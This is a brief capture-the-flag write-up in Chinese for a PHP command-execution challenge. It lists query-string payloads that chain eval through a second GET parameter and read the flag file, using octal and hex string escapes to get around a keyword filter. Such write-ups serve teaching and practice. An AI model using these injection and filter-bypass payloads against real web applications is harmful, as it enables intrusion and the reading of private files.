## Simple_RCE

---

简单命令执行绕过

> By CoHyu

### Solve

?cmd=eval($\_GET["cmd2"]);&cmd2=print_r(show_source('flag'));

?cmd=printf(file_get_contents("\146\154\141\147"));

?cmd=printf(file_get_contents("f\154ag"));

?cmd=printf(file_get_contents("\x66\x6C\x61\x67"));

url 不行
